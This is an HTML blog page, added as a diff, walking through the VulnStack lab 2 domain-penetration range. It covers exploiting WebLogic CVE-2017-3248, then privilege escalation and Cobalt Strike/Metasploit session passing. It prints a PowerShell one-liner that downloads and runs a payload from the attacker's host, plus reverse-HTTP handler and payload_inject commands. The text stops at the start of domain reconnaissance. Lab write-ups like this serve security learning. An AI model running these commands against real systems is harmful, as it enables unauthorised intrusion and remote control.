@@ -1,0 +1,1449 @@
+<!DOCTYPE html>
+<html>
+<head hexo-theme='https://github.com/volantis-x/hexo-theme-volantis/releases/tag/3.0.0'>
+  <meta charset="utf-8">
+  <!-- SEO相关 -->
+  
+    
+  
+  <!-- 渲染优化 -->
+  <meta name="renderer" content="webkit">
+  <meta name="force-rendering" content="webkit">
+  <meta http-equiv="X-UA-Compatible" content="IE=Edge,chrome=1">
+  <meta name="HandheldFriendly" content="True" >
+  <meta name="apple-mobile-web-app-capable" content="yes">
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+
+  <!-- 页面元数据 -->
+  
+  <title>从VlunStack靶机二学习域渗透 - 明月归的小站</title>
+  
+    <meta name="keywords" content="vulnstack,域渗透">
+  
+
+  
+    <meta name="description" content="闲来无事，跟着大佬思路做下！！！">
+  
+
+  <!-- feed -->
+  
+
+  <!-- import meta -->
+  
+
+  <!-- link -->
+  
+    
+<link rel="stylesheet" href="/static/js-css/all.min.css">
+
+  
+  
+    
+<link rel="stylesheet" href="/static/js-css/font-awesome-animation.min.css">
+
+  
+  
+    
+<link rel="stylesheet" href="/static/js-css/jquery.fancybox.min.css">
+
+  
+
+  
+    
+<link rel="stylesheet" href="/static/js-css/waves.min.css">
+
+  
+
+  
+
+  
+
+  
+
+  <!-- import link -->
+  
+
+  
+  
+    
+<link rel="stylesheet" href="/css/style.css">
+
+  
+
+  
+  
+</head>
+
+<body>
+  
+  
+  
+  <div class="cover-wrapper">
+    <cover class='cover post' style="display: none;">
+      <div class='cover-body'>
+  <div class='a'>
+    
+    
+    
+  </div>
+  <div class='b'>
+    <div class='menu navigation dock'>
+      <div class='list-h'>
+        
+      </div>
+    </div>
+  </div>
+</div>
+
+      <div class="scroll-down" style="display: none;"><i class="fa fa-chevron-down scroll-down-effects"></i></div>
+    </cover>
+    <header class="l_header shadow blur">
+  <div class='container'>
+  <div class='wrapper'>
+    <div class='nav-sub'>
+      <p class="title"></p>
+      <ul class='switcher nav-list-h m-phone' id="pjax-header-nav-list">
+        <li><a class="s-comment fas fa-comments fa-fw" target="_self" href='javascript:void(0)'></a></li>
+        
+          <li><a class="s-toc fas fa-list fa-fw" target="_self" href='javascript:void(0)'></a></li>
+        
+      </ul>
+    </div>
+		<div class="nav-main">
+      
+        
+        <a class="title flat-box" target="_self" href='/'>
+          
+          
+          
+        </a>
+      
+
+			<div class='menu navigation'>
+				<ul class='nav-list-h m-pc'>
+          
+          
+          
+            
+            
+              <li>
+                <a class="menuitem flat-box faa-parent animated-hover" href=/
+                  
+                  
+                  
+                    id="home"
+                  >
+                  <i class='fas fa-rss fa-fw'></i>博客
+                </a>
+                
+              </li>
+            
+          
+          
+            
+            
+              <li>
+                <a class="menuitem flat-box faa-parent animated-hover" href=/archives/
+                  
+                  
+                  
+                    id="archives"
+                  >
+                  <i class='fas fa-archive fa-fw'></i>归档
+                </a>
+                
+              </li>
+            
+          
+          
+            
+            
+              <li>
+                <a class="menuitem flat-box faa-parent animated-hover" href=/tags/
+                  
+                  
+                  
+                    id="tags"
+                  >
+                  <i class='fas fa-tags fa-fw'></i>标签
+                </a>
+                
+              </li>
+            
+          
+          
+            
+            
+              <li>
+                <a class="menuitem flat-box faa-parent animated-hover" href=/friends/
+                  
+                  
+                  
+                    id="friends"
+                  >
+                  <i class='fas fa-link fa-fw'></i>友链
+                </a>
+                
+              </li>
+            
+          
+          
+            
+            
+              <li>
+                <a class="menuitem flat-box faa-parent animated-hover" href=/about/
+                  
+                  
+                  
+                    id="about"
+                  >
+                  <i class='fas fa-info-circle fa-fw'></i>关于
+                </a>
+                
+              </li>
+            
+          
+          
+				</ul>
+			</div>
+
+      <div class="m_search">
+        <form name="searchform" class="form u-search-form">
+          <i class="icon fas fa-search fa-fw"></i>
+          <input type="text" class="input u-search-input" placeholder="Search..." />
+        </form>
+      </div>
+
+			<ul class='switcher nav-list-h m-phone'>
+				
+					<li><a class="s-search fas fa-search fa-fw" target="_self" href='javascript:void(0)'></a></li>
+				
+				<li>
+          <a class="s-menu fas fa-bars fa-fw" target="_self" href='javascript:void(0)'></a>
+          <ul class="menu-phone list-v navigation white-box">
+            
+              
+            
+              <li>
+                <a class="menuitem flat-box faa-parent animated-hover" href=/
+                  
+                  
+                  
+                    id="home"
+                  >
+                  <i class='fas fa-rss fa-fw'></i>博客
+                </a>
+                
+              </li>
+            
+          
+            
+              
+            
+              <li>
+                <a class="menuitem flat-box faa-parent animated-hover" href=/archives/
+                  
+                  
+                  
+                    id="archives"
+                  >
+                  <i class='fas fa-archive fa-fw'></i>归档
+                </a>
+                
+              </li>
+            
+          
+            
+              
+            
+              <li>
+                <a class="menuitem flat-box faa-parent animated-hover" href=/tags/
+                  
+                  
+                  
+                    id="tags"
+                  >
+                  <i class='fas fa-tags fa-fw'></i>标签
+                </a>
+                
+              </li>
+            
+          
+            
+              
+            
+              <li>
+                <a class="menuitem flat-box faa-parent animated-hover" href=/friends/
+                  
+                  
+                  
+                    id="friends"
+                  >
+                  <i class='fas fa-link fa-fw'></i>友链
+                </a>
+                
+              </li>
+            
+          
+            
+              
+            
+              <li>
+                <a class="menuitem flat-box faa-parent animated-hover" href=/about/
+                  
+                  
+                  
+                    id="about"
+                  >
+                  <i class='fas fa-info-circle fa-fw'></i>关于
+                </a>
+                
+              </li>
+            
+          
+            
+          </ul>
+        </li>
+			</ul>
+		</div>
+	</div>
+  </div>
+</header>
+
+  </div>
+  
+
+
+  <div class="l_body nocover">
+    <div class='body-wrapper' id="pjax-container">
+      
+        <!--此文件用来存放一些不方便取值的变量--> 
+<!--思路大概是将值藏到重加载的区域内--> 
+ 
+ 
+ 
+<div id="pjax-data" style="display: none"> 
+  <div id="pjax-ispage">true</div> 
+  <div id="pjax-pageTitle">从VlunStack靶机二学习域渗透</div> 
+  <div id="pjax-enable-cover">true</div> 
+  <div id="pjax-comment-path">none</div> 
+  <div id="pjax-comment-placeholder">none</div> 
+</div> 
+ 
+ 
+<script> 
+  // 处理封面 此时 jquery 还没加载 
+  if ("none" == "none") { // 移除封面 
+    document.getElementsByClassName('cover')[0].style.display = "none"; 
+    document.getElementsByClassName('l_body')[0].classList.add("nocover"); 
+    document.getElementsByClassName('l_header', 'cover-wrapper')[0].classList.add("show"); 
+  } else { 
+    if ("none" == "blog") { // 半屏 
+      document.getElementsByClassName('cover')[0].classList.remove("full"); 
+      document.getElementsByClassName('cover')[0].classList.add("half"); 
+      document.getElementsByClassName('scroll-down')[0].style.display = "none"; 
+    } else if ("none" == "docs") { // 全屏 
+      document.getElementsByClassName('cover')[0].classList.remove("half"); 
+      document.getElementsByClassName('cover')[0].classList.add("full"); 
+      document.getElementsByClassName('scroll-down')[0].style.display = ""; 
+    } 
+    document.getElementsByClassName('cover')[0].style.display = ""; 
+    document.getElementsByClassName('l_body', 'show')[0].classList.remove("nocover"); 
+    document.getElementsByClassName('l_header', 'cover-wrapper')[0].classList.remove("show"); 
+  } 
+</script> 
+
+      
+      
+
+<div class='l_main'>
+  
+
+  
+    <article id="post" class="post white-box reveal shadow article-type-post" itemscope itemprop="blogPost">
+      
+
+
+  <section class='meta'>
+    
+      
+      
+      <div class="meta" id="header-meta">
+        
+          
+  <h1 class="title">
+    <a href="/2020/12/14/%E9%9D%B6%E5%9C%BA%E6%B5%8B%E8%AF%95/%E4%BB%8EVlunStack%E9%9D%B6%E5%9C%BA%E4%BA%8C%E5%AD%A6%E4%B9%A0%E5%9F%9F%E6%B8%97%E9%80%8F/">
+      从VlunStack靶机二学习域渗透
+    </a>
+  </h1>
+
+
+        
+        <div class='new-meta-box'>
+          
+            
+          
+            
+              
+<div class='new-meta-item author'>
+  <a class='author' href="/" rel="nofollow">
+    <img no-lazy src="/pic/youxiang.jpg">
+    <p>MoonBack</p>
+  </a>
+</div>
+
+            
+          
+            
+              
+
+            
+          
+            
+              <div class="new-meta-item date">
+  <a class='notlink'>
+    <i class="fas fa-calendar-alt fa-fw" aria-hidden="true"></i>
+    <p>发布于：2020年12月14日</p>
+  </a>
+</div>
+
+            
+          
+            
+              
+  <div class="new-meta-item wordcount">
+    <a class='notlink'>
+      <i class="fas fa-keyboard fa-fw" aria-hidden="true"></i>
+      <p>字数：2.8k字</p>
+    </a>
+  </div>
+  <div class="new-meta-item readtime">
+    <a class='notlink'>
+      <i class="fas fa-hourglass-half fa-fw" aria-hidden="true"></i>
+      <p>时长：11分钟</p>
+    </a>
+  </div>
+
+
+            
+          
+            
+              
+  <div class="new-meta-item browse valine">
+    <a class='notlink'>
+      <i class="fas fa-eye fa-fw" aria-hidden="true"></i>
+      
+      <span id="/2020/12/14/%E9%9D%B6%E5%9C%BA%E6%B5%8B%E8%AF%95/%E4%BB%8EVlunStack%E9%9D%B6%E5%9C%BA%E4%BA%8C%E5%AD%A6%E4%B9%A0%E5%9F%9F%E6%B8%97%E9%80%8F/" class="leancloud_visitors" data-flag-title="从VlunStack靶机二学习域渗透">
+      <p>
+        <span class="leancloud-visitors-count"></span>
+      </p>
+      </span>
+    </a>
+  </div>
+
+
+            
+          
+            
+              
+<div class="new-meta-item comments-count">
+  
+  <a href="/2020/12/14/%E9%9D%B6%E5%9C%BA%E6%B5%8B%E8%AF%95/%E4%BB%8EVlunStack%E9%9D%B6%E5%9C%BA%E4%BA%8C%E5%AD%A6%E4%B9%A0%E5%9F%9F%E6%B8%97%E9%80%8F/#comments">
+    <i class="fas fa-comment-dots fa-fw"></i>
+    <span class="valine-comment-count" data-xid="/2020/12/14/%E9%9D%B6%E5%9C%BA%E6%B5%8B%E8%AF%95/%E4%BB%8EVlunStack%E9%9D%B6%E5%9C%BA%E4%BA%8C%E5%AD%A6%E4%B9%A0%E5%9F%9F%E6%B8%97%E9%80%8F/">0</span>
+    <span class="leancloud-comments-count">&nbsp;</span>
+  </a>
+</div>
+
+
+            
+          
+            
+              
+
+            
+          
+        </div>
+        
+          <hr>
+        
+      </div>
+    
+  </section>
+
+
+      <section class="article typo">
+        <div class="article-entry" itemprop="articleBody">
+          
+          
+          <p>闲来无事，跟着大佬思路做下！！！</p>
+<a id="more"></a>
+
+<h2 id="环境说明"><a href="#环境说明" class="headerlink" title="环境说明"></a>环境说明</h2><p>靶机链接：<a target="_blank" rel="noopener" href="http://vulnstack.qiyuanxuetang.net/vuln/detail/3/">http://vulnstack.qiyuanxuetang.net/vuln/detail/3/</a></p>
+<p>内网网段：10.10.10.1/24</p>
+<p>DMZ网段：192.168.111.1/24</p>
+<p>测试机地址：192.168.111.1（Windows），192.168.111.11（Linux）</p>
+<p>防火墙策略（策略设置过后，测试机只能访问192段地址，模拟公网访问）：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">deny all tcp ports：10.10.10.1</span><br><span class="line">allow all tcp ports：10.10.10.0&#x2F;24</span><br></pre></td></tr></table></figure>
+
+<p><strong>DC</strong></p>
+<p>IP：10.10.10.10   OS：Windows 2012(64)</p>
+<p>应用：AD域</p>
+<p><strong>WEB</strong></p>
+<p>IP1：10.10.10.80 IP2：192.168.111.80   OS：Windows 2008(64)</p>
+<p>应用：Weblogic 10.3.6    MSSQL 2008</p>
+<p><strong>PC</strong></p>
+<p>IP1：10.10.10.201   IP2：192.168.111.201   OS：Windows 7(32)</p>
+<p>应用：</p>
+<p><strong>攻击机</strong></p>
+<p>IP：192.168.111.1   OS：Windows 10(64)</p>
+<p>IP：192.168.111.11   OS：Parrot(64)</p>
+<h3 id="一些名词概念"><a href="#一些名词概念" class="headerlink" title="一些名词概念"></a>一些名词概念</h3><h4 id="DMZ"><a href="#DMZ" class="headerlink" title="DMZ"></a>DMZ</h4><p>英文为<code>demilitarized zone</code>，中文名称为“隔离区”，也称“非军事化区”，是指内外网防火墙之间的区域，DMZ区是一个缓冲区，在DMZ区存放着一些公共服务器，比如论坛等。</p>
+<p>DMZ的特点如下：</p>
+<ul>
+<li><p>内网可以访问外网，内网的用户需要自由地访问外网。在这一策略中，防火墙需要执行NAT。</p>
+</li>
+<li><p>内网可以访问DMZ，此策略使内网用户可以使用或者管理DMZ中的服务器。</p>
+</li>
+<li><p>外网不能访问内网，这是防火墙的基本策略了，内网中存放的是公司内部数据，显然这些数据是不允许外网的用户进行访问的。如果要访问，就要通过VPN方式来进行。</p>
+</li>
+<li><p>外网可以访问DMZ，DMZ中的服务器需要为外界提供服务，所以外网必须可以访问DMZ。同时，外网访问DMZ需要由防火墙完成对外地址到服务器实际地址的转换。</p>
+</li>
+<li><p>DMZ不能访问内网，如不执行此策略，则当入侵者攻陷DMZ时，内部网络将不会受保护。　</p>
+</li>
+<li><p>DMZ不能访问外网，此条策略也有例外，比如我们的例子中，在DMZ中放置邮件服务器时，就需要访问外网，否则将不能正常工作。</p>
+</li>
+</ul>
+<h4 id="AD"><a href="#AD" class="headerlink" title="AD"></a>AD</h4><p>活动目录（Active Directory）主要是指是面向Windows Server的目录服务。（Active Directory不能运行在Windows Web Server上，但是可以通过它对运行Windows Web Server的计算机进行管理。）Active Directory存储了有关网络对象的信息，并且让管理员和用户能够轻松地查找和使用这些信息。Active Directory使用了一种结构化的数据存储方式，并以此作为基础对目录信息进行合乎逻辑的分层组织。</p>
+<h4 id="DC"><a href="#DC" class="headerlink" title="DC"></a>DC</h4><p>域控制器( Domain controller，DC)是活动目录的存储位置,安装了活动目录的计算机称为域控制器。</p>
+<h3 id="网络配置"><a href="#网络配置" class="headerlink" title="网络配置"></a>网络配置</h3><p>在虚拟网络配置器里增加一个网卡 这里添加的是VMnet2 设置如下:</p>
+<p><img src="/2020/12/14/%E9%9D%B6%E5%9C%BA%E6%B5%8B%E8%AF%95/%E4%BB%8EVlunStack%E9%9D%B6%E5%9C%BA%E4%BA%8C%E5%AD%A6%E4%B9%A0%E5%9F%9F%E6%B8%97%E9%80%8F/image-20201225230954947.png" alt="image-20201225230954947"></p>
+<p>注意将主机虚拟适配器连接到此网络取消勾选 子网ip设置为10.10.10.0</p>
+<p>接着修改下NAT的网段  改成192.168.111.0</p>
+<p><img src="/2020/12/14/%E9%9D%B6%E5%9C%BA%E6%B5%8B%E8%AF%95/%E4%BB%8EVlunStack%E9%9D%B6%E5%9C%BA%E4%BA%8C%E5%AD%A6%E4%B9%A0%E5%9F%9F%E6%B8%97%E9%80%8F/image-20201225231225233.png" alt="image-20201225231225233"></p>
+<p>各靶机的连接情况：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">DC  	&#x3D;&#x3D;&gt;   VMnet2</span><br><span class="line">WEB		&#x3D;&#x3D;&gt;   VMnet2 NAT</span><br><span class="line">PC  	&#x3D;&#x3D;&gt;   VMnet2 NAT</span><br></pre></td></tr></table></figure>
+
+<p>关于网络设置 我也不是很懂 web那个是dmz按理说不能出网的 但不出网又没法反弹shell</p>
+<h2 id="拿下web机器"><a href="#拿下web机器" class="headerlink" title="拿下web机器"></a>拿下web机器</h2><h3 id="weblogic到cs上线"><a href="#weblogic到cs上线" class="headerlink" title="weblogic到cs上线"></a>weblogic到cs上线</h3><p>web机器上的weblogic服务默认没有开启 找到<code>C:\Oracle\Middleware\user_projects\domains\base_domain\bin</code>目录 右键以管理员身份运行<code>startWebLogic.bat</code> </p>
+<p>访问：<a target="_blank" rel="noopener" href="http://192.168.111.80:7001/">http://192.168.111.80:7001/</a></p>
+<p><img src="/2020/12/14/%E9%9D%B6%E5%9C%BA%E6%B5%8B%E8%AF%95/%E4%BB%8EVlunStack%E9%9D%B6%E5%9C%BA%E4%BA%8C%E5%AD%A6%E4%B9%A0%E5%9F%9F%E6%B8%97%E9%80%8F/image-20201225231418989.png" alt="image-20201225231418989"></p>
+<p>使用GitHub上覆盖漏洞最多最全的检测工具：<a target="_blank" rel="noopener" href="https://github.com/0xn0ne/weblogicScanner">https://github.com/0xn0ne/weblogicScanner</a> 这个是基于star最多的<a target="_blank" rel="noopener" href="https://github.com/rabbitmask/WeblogicScan">那个</a>并进行了bug修复，提高了准确性</p>
+<p>开一个kali NAT连接网络作为攻击机 克隆下来 检测目标</p>
+<p><img src="/2020/12/14/%E9%9D%B6%E5%9C%BA%E6%B5%8B%E8%AF%95/%E4%BB%8EVlunStack%E9%9D%B6%E5%9C%BA%E4%BA%8C%E5%AD%A6%E4%B9%A0%E5%9F%9F%E6%B8%97%E9%80%8F/image-20201225233333122.png" alt="image-20201225233333122"></p>
+<p>发现确实存在不少漏洞 但是不太明显具体哪个洞 使用grep筛选一下</p>
+<p><img src="/2020/12/14/%E9%9D%B6%E5%9C%BA%E6%B5%8B%E8%AF%95/%E4%BB%8EVlunStack%E9%9D%B6%E5%9C%BA%E4%BA%8C%E5%AD%A6%E4%B9%A0%E5%9F%9F%E6%B8%97%E9%80%8F/image-20201225233447691.png" alt="image-20201225233447691"></p>
+<p>这个靶场是比较老的 考虑到当时可能还没有这些新洞 所以我们使用老洞进行打</p>
+<p>就拿第一个CVE-2017-3248来弄吧 参考：<a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/225137">https://www.anquanke.com/post/id/225137</a></p>
+<p>首先要准备两个东西 java反序列化工具ysoserial Github：<a target="_blank" rel="noopener" href="https://github.com/frohoff/ysoserial">https://github.com/frohoff/ysoserial</a></p>
+<p>直接下载打包好的jar文件：<a target="_blank" rel="noopener" href="https://jitpack.io/com/github/frohoff/ysoserial/master-SNAPSHOT/ysoserial-master-SNAPSHOT.jar">https://jitpack.io/com/github/frohoff/ysoserial/master-SNAPSHOT/ysoserial-master-SNAPSHOT.jar</a></p>
+<p>这个工具路径需要全为英文</p>
+<p>另外一个就是exploit-db上的poc：<a target="_blank" rel="noopener" href="https://www.exploit-db.com/exploits/44553">https://www.exploit-db.com/exploits/44553</a></p>
+<p>先测试下能不能用 宿主机起一个JRMP服务</p>
+<p><img src="/2020/12/14/%E9%9D%B6%E5%9C%BA%E6%B5%8B%E8%AF%95/%E4%BB%8EVlunStack%E9%9D%B6%E5%9C%BA%E4%BA%8C%E5%AD%A6%E4%B9%A0%E5%9F%9F%E6%B8%97%E9%80%8F/image-20201226094517025.png" alt="image-20201226094517025"></p>
+<p>kali使用poc攻击</p>
+<p><img src="/2020/12/14/%E9%9D%B6%E5%9C%BA%E6%B5%8B%E8%AF%95/%E4%BB%8EVlunStack%E9%9D%B6%E5%9C%BA%E4%BA%8C%E5%AD%A6%E4%B9%A0%E5%9F%9F%E6%B8%97%E9%80%8F/image-20201226094558615.png" alt="image-20201226094558615"></p>
+<p>可以看到已经能命令执行</p>
+<p><img src="/2020/12/14/%E9%9D%B6%E5%9C%BA%E6%B5%8B%E8%AF%95/%E4%BB%8EVlunStack%E9%9D%B6%E5%9C%BA%E4%BA%8C%E5%AD%A6%E4%B9%A0%E5%9F%9F%E6%B8%97%E9%80%8F/image-20201226094640763.png" alt="image-20201226094640763"></p>
+<p>尝试用powershell反弹cs 这里我在kali起cs 宿主机作为客户端控制cs 先开启cs</p>
+<p><img src="/2020/12/14/%E9%9D%B6%E5%9C%BA%E6%B5%8B%E8%AF%95/%E4%BB%8EVlunStack%E9%9D%B6%E5%9C%BA%E4%BA%8C%E5%AD%A6%E4%B9%A0%E5%9F%9F%E6%B8%97%E9%80%8F/image-20201226164334727.png" alt="image-20201226164334727"></p>
+<p><img src="/2020/12/14/%E9%9D%B6%E5%9C%BA%E6%B5%8B%E8%AF%95/%E4%BB%8EVlunStack%E9%9D%B6%E5%9C%BA%E4%BA%8C%E5%AD%A6%E4%B9%A0%E5%9F%9F%E6%B8%97%E9%80%8F/image-20201226164357792.png" alt="image-20201226164357792"></p>
+<p>先新建一个监听器</p>
+<p><img src="/2020/12/14/%E9%9D%B6%E5%9C%BA%E6%B5%8B%E8%AF%95/%E4%BB%8EVlunStack%E9%9D%B6%E5%9C%BA%E4%BA%8C%E5%AD%A6%E4%B9%A0%E5%9F%9F%E6%B8%97%E9%80%8F/image-20201226164522752.png" alt="image-20201226164522752"></p>
+<p>生成payload 选择：</p>
+<p><img src="/2020/12/14/%E9%9D%B6%E5%9C%BA%E6%B5%8B%E8%AF%95/%E4%BB%8EVlunStack%E9%9D%B6%E5%9C%BA%E4%BA%8C%E5%AD%A6%E4%B9%A0%E5%9F%9F%E6%B8%97%E9%80%8F/image-20201226164820686.png" alt="image-20201226164820686"></p>
+<p>由于命令太长 这里在宿主机起一个web服务  直接使用python起一个</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -m http.server 8000</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/12/14/%E9%9D%B6%E5%9C%BA%E6%B5%8B%E8%AF%95/%E4%BB%8EVlunStack%E9%9D%B6%E5%9C%BA%E4%BA%8C%E5%AD%A6%E4%B9%A0%E5%9F%9F%E6%B8%97%E9%80%8F/image-20201226165953315.png" alt="image-20201226165953315"></p>
+<p>继续使用那个脚本来进行命令执行 这里要执行的命令就是 即从远程加载powershell命令执行</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">powershell.exe <span class="built_in">iex</span> (<span class="built_in">new-object</span> net.webclient).downloadstring(<span class="string">&#x27;http://192.168.111.1:8000/payload.txt&#x27;</span>)</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/12/14/%E9%9D%B6%E5%9C%BA%E6%B5%8B%E8%AF%95/%E4%BB%8EVlunStack%E9%9D%B6%E5%9C%BA%E4%BA%8C%E5%AD%A6%E4%B9%A0%E5%9F%9F%E6%B8%97%E9%80%8F/image-20201226170434860.png" alt="image-20201226170434860"></p>
+<p>所有环境都准备好了 开打</p>
+<p><img src="/2020/12/14/%E9%9D%B6%E5%9C%BA%E6%B5%8B%E8%AF%95/%E4%BB%8EVlunStack%E9%9D%B6%E5%9C%BA%E4%BA%8C%E5%AD%A6%E4%B9%A0%E5%9F%9F%E6%B8%97%E9%80%8F/image-20201226170648200.png" alt="image-20201226170648200"></p>
+<p><img src="/2020/12/14/%E9%9D%B6%E5%9C%BA%E6%B5%8B%E8%AF%95/%E4%BB%8EVlunStack%E9%9D%B6%E5%9C%BA%E4%BA%8C%E5%AD%A6%E4%B9%A0%E5%9F%9F%E6%B8%97%E9%80%8F/image-20201226170714556.png" alt="image-20201226170714556"></p>
+<p><img src="/2020/12/14/%E9%9D%B6%E5%9C%BA%E6%B5%8B%E8%AF%95/%E4%BB%8EVlunStack%E9%9D%B6%E5%9C%BA%E4%BA%8C%E5%AD%A6%E4%B9%A0%E5%9F%9F%E6%B8%97%E9%80%8F/image-20201226170730755.png" alt="image-20201226170730755"></p>
+<p><img src="/2020/12/14/%E9%9D%B6%E5%9C%BA%E6%B5%8B%E8%AF%95/%E4%BB%8EVlunStack%E9%9D%B6%E5%9C%BA%E4%BA%8C%E5%AD%A6%E4%B9%A0%E5%9F%9F%E6%B8%97%E9%80%8F/image-20201226170837455.png" alt="image-20201226170837455"></p>
+<p>看到有请求发送 cs也可以上线  当前权限为Administrator 尝试使用getsystem命令失败</p>
+<p><img src="/2020/12/14/%E9%9D%B6%E5%9C%BA%E6%B5%8B%E8%AF%95/%E4%BB%8EVlunStack%E9%9D%B6%E5%9C%BA%E4%BA%8C%E5%AD%A6%E4%B9%A0%E5%9F%9F%E6%B8%97%E9%80%8F/image-20201226172057778.png" alt="image-20201226172057778"></p>
+<h3 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h3><p>systeminfo查看系统信息</p>
+<p><img src="/2020/12/14/%E9%9D%B6%E5%9C%BA%E6%B5%8B%E8%AF%95/%E4%BB%8EVlunStack%E9%9D%B6%E5%9C%BA%E4%BA%8C%E5%AD%A6%E4%B9%A0%E5%9F%9F%E6%B8%97%E9%80%8F/image-20201226211106957.png" alt="image-20201226211106957"></p>
+<p>发现系统为</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Microsoft Windows Server 2008 R2 Standard</span><br></pre></td></tr></table></figure>
+
+<p>补丁就三个 应该好提权</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[01]: KB2999226</span><br><span class="line">[02]: KB958488</span><br><span class="line">[03]: KB976902</span><br></pre></td></tr></table></figure>
+
+<p>为了方便直接使用cs的插件提权：<a target="_blank" rel="noopener" href="https://github.com/pandasec888/taowu-cobalt-strike">https://github.com/pandasec888/taowu-cobalt-strike</a></p>
+<p><img src="/2020/12/14/%E9%9D%B6%E5%9C%BA%E6%B5%8B%E8%AF%95/%E4%BB%8EVlunStack%E9%9D%B6%E5%9C%BA%E4%BA%8C%E5%AD%A6%E4%B9%A0%E5%9F%9F%E6%B8%97%E9%80%8F/image-20201226211720390.png" alt="image-20201226211720390"></p>
+<p>直接用ms14-058 可以看到已经收到一个system的会话 提权成功</p>
+<p>下面再介绍一些技巧</p>
+<h3 id="cs-msf会话互转"><a href="#cs-msf会话互转" class="headerlink" title="cs/msf会话互转"></a>cs/msf会话互转</h3><p><strong>cs会话转msf</strong>  </p>
+<p>msf监听</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">handler -H 192.168.111.128 -P 4444 -p windows/meterpreter/reverse_http</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/12/14/%E9%9D%B6%E5%9C%BA%E6%B5%8B%E8%AF%95/%E4%BB%8EVlunStack%E9%9D%B6%E5%9C%BA%E4%BA%8C%E5%AD%A6%E4%B9%A0%E5%9F%9F%E6%B8%97%E9%80%8F/image-20201226174625705.png" alt="image-20201226174625705"></p>
+<p>cs增加会话 新增一个监听器 ip端口填对应就行</p>
+<p><img src="/2020/12/14/%E9%9D%B6%E5%9C%BA%E6%B5%8B%E8%AF%95/%E4%BB%8EVlunStack%E9%9D%B6%E5%9C%BA%E4%BA%8C%E5%AD%A6%E4%B9%A0%E5%9F%9F%E6%B8%97%E9%80%8F/image-20201226174414270.png" alt="image-20201226174414270"></p>
+<p>选中目标 选中监听器确定就行</p>
+<p><img src="/2020/12/14/%E9%9D%B6%E5%9C%BA%E6%B5%8B%E8%AF%95/%E4%BB%8EVlunStack%E9%9D%B6%E5%9C%BA%E4%BA%8C%E5%AD%A6%E4%B9%A0%E5%9F%9F%E6%B8%97%E9%80%8F/image-20201226174549128.png" alt="image-20201226174549128"></p>
+<p>这边msf已经接收到会话</p>
+<p><img src="/2020/12/14/%E9%9D%B6%E5%9C%BA%E6%B5%8B%E8%AF%95/%E4%BB%8EVlunStack%E9%9D%B6%E5%9C%BA%E4%BA%8C%E5%AD%A6%E4%B9%A0%E5%9F%9F%E6%B8%97%E9%80%8F/image-20201226174732139.png" alt="image-20201226174732139"></p>
+<p>或者选择spawn as</p>
+<p><img src="/2020/12/14/%E9%9D%B6%E5%9C%BA%E6%B5%8B%E8%AF%95/%E4%BB%8EVlunStack%E9%9D%B6%E5%9C%BA%E4%BA%8C%E5%AD%A6%E4%B9%A0%E5%9F%9F%E6%B8%97%E9%80%8F/image-20201227182414375.png" alt="image-20201227182414375"></p>
+<p>选择对应的监听器</p>
+<p><img src="/2020/12/14/%E9%9D%B6%E5%9C%BA%E6%B5%8B%E8%AF%95/%E4%BB%8EVlunStack%E9%9D%B6%E5%9C%BA%E4%BA%8C%E5%AD%A6%E4%B9%A0%E5%9F%9F%E6%B8%97%E9%80%8F/image-20201227182442154.png" alt="image-20201227182442154"></p>
+<p><strong>msf会话转cs</strong>  </p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">use exploit/windows/<span class="built_in">local</span>/payload_inject</span><br><span class="line"><span class="built_in">set</span> payload windows/meterpreter/reverse_http</span><br><span class="line"><span class="built_in">set</span> session 1</span><br><span class="line"><span class="built_in">set</span> lhost 192.168.111.128</span><br><span class="line"><span class="built_in">set</span> lport 369</span><br><span class="line"><span class="built_in">set</span> disablepayloadhandler <span class="literal">true</span></span><br><span class="line">run</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/12/14/%E9%9D%B6%E5%9C%BA%E6%B5%8B%E8%AF%95/%E4%BB%8EVlunStack%E9%9D%B6%E5%9C%BA%E4%BA%8C%E5%AD%A6%E4%B9%A0%E5%9F%9F%E6%B8%97%E9%80%8F/image-20201226181358581.png" alt="image-20201226181358581"></p>
+<p>可以看到cs里已经收到会话</p>
+<p><img src="/2020/12/14/%E9%9D%B6%E5%9C%BA%E6%B5%8B%E8%AF%95/%E4%BB%8EVlunStack%E9%9D%B6%E5%9C%BA%E4%BA%8C%E5%AD%A6%E4%B9%A0%E5%9F%9F%E6%B8%97%E9%80%8F/image-20201226181423021.png" alt="image-20201226181423021"></p>
+<h2 id="拿下域控"><a href="#拿下域控" class="headerlink" title="拿下域控"></a>拿下域控</h2><p>现在我们已经有一台机器的shell了 想怎么拿到域控的权限？接着就是后渗透部分了</p>
+<h3 id="域内信息收集"><a href="#域内信息收集" class="headerlink" title="域内信息收集"></a>域内信息收集</h3><p>判断web机器是否在域内 如下命令:</p>
+<p>可以查看主机所有网卡的获取到的ip地址 一般情况下某个网段的dns服务器就是域控</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ipconfig /all</span><br></pre></td></tr></table></figure>
+
+<p>信息收集</p>
